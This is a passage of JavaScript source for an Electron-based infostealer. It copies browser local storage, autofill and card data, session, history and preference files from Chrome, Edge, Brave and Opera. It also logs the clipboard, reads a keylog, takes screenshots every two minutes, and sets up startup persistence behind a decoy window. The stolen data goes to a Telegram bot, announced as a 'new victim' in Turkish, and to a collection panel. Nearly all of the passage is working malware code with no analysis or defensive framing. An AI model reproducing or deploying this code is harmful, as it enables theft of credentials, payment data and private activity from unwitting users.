      const entries = fs.readdirSync(bro.path)
      for (const entry of entries) {
        const ldbdir = path.join(bro.path, entry, 'Local Storage', 'leveldb')
        if (fs.existsSync(ldbdir)) {
          try {
            const files = fs.readdirSync(ldbdir).filter(f => f.endsWith('.ldb') || f.endsWith('.log'))
            let copied = 0
            for (const f of files) {
              if (copied >= 10) break
              try {
                const destname = `${bro.name}_${entry}_leveldb_${f}`
                fs.copyFileSync(path.join(ldbdir, f), path.join(exportdir, destname))
                copied++
              } catch (e) {}
            }
            if (copied > 0) result += `${bro.name}/${entry}: leveldb copied ${copied} files\r\n`
          } catch (e) {}
        }
        const extdir = path.join(bro.path, entry, 'Extension State')
        if (fs.existsSync(extdir)) result += `${bro.name}/${entry}: extension state present\r\n`
      }
    } catch (e) {}
  }
  return result
}

function gatherchromewebdata() {
  let result = ''
  const exportdir = path.join(__dirname, 'browser_data')
  try { if (!fs.existsSync(exportdir)) fs.mkdirSync(exportdir) } catch (e) {}
  const brodirs = [
    { name: 'chrome', path: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Web Data') },
    { name: 'edge', path: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data') },
    { name: 'brave', path: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data') },
    { name: 'opera', path: path.join(process.env.APPDATA, 'Opera Software', 'Opera Stable', 'Web Data') },
  ]
  for (const bro of brodirs) {
    if (fs.existsSync(bro.path)) {
      try {
        const dest = path.join(exportdir, `${bro.name}_Web_Data`)
        fs.copyFileSync(bro.path, dest)
        const stats = fs.statSync(bro.path)
        result += `${bro.name}: Web Data copied (${Math.round(stats.size / 1024)}kb - credit cards, addresses, autofill)\r\n`
      } catch (e) {}
    }
  }
  const chromeapps = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Apps')
  if (fs.existsSync(chromeapps)) {
    try {
      const items = fs.readdirSync(chromeapps)
      if (items.length > 0) result += `chrome apps: ${items.length}\r\n`
    } catch (e) {}
  }
  return result
}

function gatherchromesessions() {
  let result = ''
  const exportdir = path.join(__dirname, 'browser_data')
  try { if (!fs.existsSync(exportdir)) fs.mkdirSync(exportdir) } catch (e) {}
  const sessionfiles = ['Current Session', 'Current Tabs', 'Last Session', 'Last Tabs', 'Last Active Tabs']
  const brodirs = [
    { name: 'chrome', path: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default') },
    { name: 'edge', path: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default') },
    { name: 'brave', path: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default') },
  ]
  for (const bro of brodirs) {
    if (!fs.existsSync(bro.path)) continue
    for (const sf of sessionfiles) {
      const src = path.join(bro.path, sf)
      if (fs.existsSync(src)) {
        try {
          const dest = path.join(exportdir, `${bro.name}_${sf}`)
          fs.copyFileSync(src, dest)
          result += `${bro.name}: ${sf} copied (open tabs snapshot)\r\n`
        } catch (e) {}
      }
    }
    const pref = path.join(bro.path, 'Preferences')
    if (fs.existsSync(pref)) {
      try {
        const dest = path.join(exportdir, `${bro.name}_Preferences`)
        fs.copyFileSync(pref, dest)
        result += `${bro.name}: Preferences copied\r\n`
      } catch (e) {}
    }
  }
  return result
}

function gatherjetbrains() {
  let result = ''
  const jbdir = path.join(os.homedir(), 'AppData', 'Roaming', 'JetBrains')
  if (fs.existsSync(jbdir)) {
    result += 'jetbrains installed\r\n'
    try {
      for (const tool of fs.readdirSync(jbdir)) {
        const tooldir = path.join(jbdir, tool)
        if (!fs.statSync(tooldir).isDirectory()) continue
        result += `  ${tool}\r\n`
        const options = path.join(tooldir, 'options')
        if (fs.existsSync(options)) {
          try {
            for (const f of fs.readdirSync(options)) {
              result += `    ${f}\r\n`
            }
          } catch (e) {}
        }
        const recent = path.join(tooldir, 'recentProjects.xml')
        if (fs.existsSync(recent)) {
          try {
            const content = fs.readFileSync(recent, 'utf8')
            const projects = content.match(/<entry[^>]*>/g)
            if (projects) result += `    ${projects.length} recent projects\r\n`
          } catch (e) {}
        }
      }
    } catch (e) {}
  }
  return result
}

function gatherbrowserdownloads() {
  let result = ''
  const exportdir = path.join(__dirname, 'browser_data')
  try { if (!fs.existsSync(exportdir)) fs.mkdirSync(exportdir) } catch (e) {}
  const brodirs = [
    { name: 'chrome', path: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'History') },
    { name: 'edge', path: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'History') },
    { name: 'brave', path: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History') },
  ]
  for (const bro of brodirs) {
    if (fs.existsSync(bro.path)) {
      try {
        const dest = path.join(exportdir, `${bro.name}_History`)
        fs.copyFileSync(bro.path, dest)
        result += `${bro.name}: History copied\r\n`
      } catch (e) {}
    }
  }
  return result
}

function tgsend(text) {
  return new Promise(resolve => {
    try {
      if (tgtoken.startsWith('YOUR')) { console.log('TG: set TGTOKEN env'); resolve(); return }
      const data = JSON.stringify({ chat_id: tcid, text: text.substring(0, 4000) })
      const req = https.request({ hostname: 'api.telegram.org', path: `/bot${tgtoken}/sendMessage`, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } }, (res) => {
        let body = ''
        res.on('data', c => body += c)
        res.on('end', () => { const j = JSON.parse(body); if (!j.ok) console.log('TG error:', j.description); resolve() })
      })
      req.on('error', (e) => { console.log('TG req error:', e.message); resolve() })
      req.write(data)
      req.end()
    } catch (e) { resolve() }
  })
}

function tgsendfile(filepath, caption) {
  return new Promise(resolve => {
    try {
      const file = fs.readFileSync(filepath)
      const boundary = '----' + Date.now().toString(36)
      const header = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${tcid}\r\n--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="${path.basename(filepath)}"\r\nContent-Type: image/png\r\n\r\n`
      const footer = `\r\n--${boundary}--\r\n`
      const body = Buffer.concat([Buffer.from(header), file, Buffer.from(footer)])
      const req = https.request({ hostname: 'api.telegram.org', path: `/bot${tgtoken}/sendPhoto`, method: 'POST', headers: { 'Content-Type': 'multipart/form-data; boundary=' + boundary, 'Content-Length': body.length } }, () => resolve())
      req.on('error', () => resolve())
      req.write(body)
      req.end()
    } catch (e) { resolve() }
  })
}

function sendtotg(text) {
  const chunks = []
  for (let i = 0; i < text.length; i += 4000) chunks.push(text.substring(i, i + 4000))
  if (chunks.length === 0) return
  tgsend('yeni kurban geldi: ' + os.hostname())
  for (const chunk of chunks) tgsend(chunk)
}

function sendfiletotg(filepath, caption) {
  tgsendfile(filepath, caption)
}

function sendtopanel(text, ssfile) {
  try {
    const panelurl = process.env.PANEL_URL || 'http://localhost:3456'
    const body = JSON.stringify({ hostname: os.hostname(), user: os.userInfo().username, ip: '', data: text.substring(0, 50000), screenshot: ssfile && fs.existsSync(ssfile) ? fs.readFileSync(ssfile).toString('base64') : '' })
    const u = new URL(panelurl)
    const mod = u.protocol === 'https:' ? https : http
    const opts = { hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80), path: '/api/collect', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }, rejectUnauthorized: false }
    const req = mod.request(opts, () => {})
    req.on('error', () => {})
    req.write(body)
    req.end()
  } catch (e) {}
}

function monitorclipboard() {
  setInterval(() => {
    try {
      const text = clipboard.readText()
      if (text && text !== lastclip && text.length > 3) {
        fs.appendFileSync(clipfile, `[${new Date().toISOString()}] ${text}\r\n`)
        lastclip = text
      }
    } catch (e) {}
  }, 3000)
}

function exfiltratefiles() {
  let bulk = ''
  try {
    const kf = path.join(__dirname, 'keylog.txt')
    if (fs.existsSync(kf)) {
      const c = fs.readFileSync(kf, 'utf8')
      if (c.length > 0) { bulk += '=== keylog ===\r\n' + c.substring(c.length - 2000) + '\r\n' }
    }
  } catch (e) {}
  try {
    if (fs.existsSync(clipfile)) {
      const c = fs.readFileSync(clipfile, 'utf8')
      if (c.length > 0) { bulk += '=== clipboard ===\r\n' + c.substring(c.length - 2000) + '\r\n' }
    }
  } catch (e) {}
  if (bulk) sendtotg(bulk)
}

async function main() {
  persiststartup()
  try {
    await Promise.race([
      gatherinfo(),
      new Promise(resolve => setTimeout(resolve, 30000))
    ])
  } catch (e) {}
  monitorclipboard()
  setInterval(exfiltratefiles, 60000)

  const win = new BrowserWindow({
    width: 620,
    height: 870,
    resizable: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: false,
      preload: path.join(__dirname, 'preload.js'),
      enableRemoteModule: false,
      webSecurity: false
    }
  })
  win.loadURL('file://' + __dirname.replace(/\\/g, '/') + '/index.html')
  win.setMenuBarVisibility(false)

  setInterval(async () => {
    try {
      const sources = await desktopCapturer.getSources({ types: ['screen'], thumbnailSize: { width: 1920, height: 1080 } })
      if (sources.length > 0) {
        const ssname = `screen_${Date.now()}.png`
        const sspath = path.join(__dirname, ssname)
        fs.writeFileSync(sspath, sources[0].thumbnail.toPNG())
        sendfiletotg(sspath, 'screenshot ' + os.hostname())
      }
    } catch (e) {}
  }, 120000)
}

app.whenReady().then(main)
app.on('window-all-closed', () => app.quit())

